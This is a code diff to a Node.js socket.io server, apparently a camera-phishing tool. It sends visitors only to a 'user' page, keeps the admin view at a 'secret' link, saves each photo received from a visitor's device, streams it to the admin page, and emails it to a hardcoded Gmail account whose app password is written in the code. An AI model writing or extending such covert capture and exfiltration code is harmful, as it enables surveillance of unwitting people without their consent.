@@ -3,49 +3,55 @@ const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
 const fs = require('fs');
+const nodemailer = require('nodemailer');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Folder setup for local storage
+// Email Setup (Apna Gmail aur App Password yaha dalein)
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'prectice@gmail.com', // 👈 Apni Gmail ID
+        pass: 'includestdiosystem' // 👈 16-digit App Password
+    }
+});
+
+// Storage folder setup
 const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
-// Serve all files from root and public directories
 app.use(express.static(__dirname));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(uploadDir));
 
-// Main Link (Home Page) - Isse aapko dono links screen par hi mil jayenge
+// 1. MAIN LINK: Main link kholne par sirf USER page khulega
 app.get('/', (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Camera Project Dashboard</title>
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body { font-family: Arial, sans-serif; text-align: center; padding: 40px 20px; background: #121212; color: white; }
-                h1 { color: #00e676; margin-bottom: 30px; }
-                .btn { display: block; width: 80%; max-width: 300px; margin: 15px auto; padding: 15px; background: #2979ff; color: white; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 8px; }
-                .btn-admin { background: #ff1744; }
-                p { color: #aaa; margin-top: 20px; }
-            </style>
-        </head>
-        <body>
-            <h1>🚀 Camera Project Control</h1>
-            <a href="/user.html" class="btn">📱 Open User Page</a>
-            <a href="/admin.html" class="btn btn-admin">👑 Open Admin Page</a>
-            <p>Dono me se jo page kholna chahein us par click karein.</p>
-        </body>
-        </html>
-    `);
+    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
+        ? path.join(__dirname, 'public', 'user.html')
+        : path.join(__dirname, 'user.html');
+    res.sendFile(userPath);
 });
 
-// Socket.io connections
+// 2. USER LINK: Direct User Page
+app.get('/user.html', (req, res) => {
+    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
+        ? path.join(__dirname, 'public', 'user.html')
+        : path.join(__dirname, 'user.html');
+    res.sendFile(userPath);
+});
+
+// 3. ADMIN LINK: Direct Secret Admin Page (Aapke liye)
+app.get('/admin.html', (req, res) => {
+    const adminPath = fs.existsSync(path.join(__dirname, 'public', 'admin.html'))
+        ? path.join(__dirname, 'public', 'admin.html')
+        : path.join(__dirname, 'admin.html');
+    res.sendFile(adminPath);
+});
+
 io.on('connection', (socket) => {
     console.log('⚡ Connected Device ID:', socket.id);
 
@@ -58,11 +64,36 @@ io.on('connection', (socket) => {
         const fileName = `photo_${Date.now()}.png`;
         const filePath = path.join(uploadDir, fileName);
 
+        // Photo Save locally
         fs.writeFile(filePath, base64Data, 'base64', (err) => {
-            if (!err) console.log(`✅ Photo Auto-Saved: uploads/${fileName}`);
+            if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
         });
 
+        // Broadcast to Admin Live UI
         io.emit('send-photo-to-admin', imageData);
+
+        // Gmail par photo bhejne ka setup
+        const mailOptions = {
+            from: 'prectice@gmail.com', // 👈 Apni Gmail
+            to: 'prectice@gmail.com',   // 👈 Jis Email par photo chahiye
+            subject: '📸 New Photo Captured!',
+            text: 'Nayi photo capture ho gayi hai.',
+            attachments: [
+                {
+                    filename: fileName,
+                    content: base64Data,
+                    encoding: 'base64'
+                }
+            ]
+        };
+
+        transporter.sendMail(mailOptions, (error, info) => {
+            if (error) {
+                console.log('❌ Email Send Error:', error);
+            } else {
+                console.log('📧 Email Sent Successfully:', info.response);
+            }
+        });
     });
 });
 
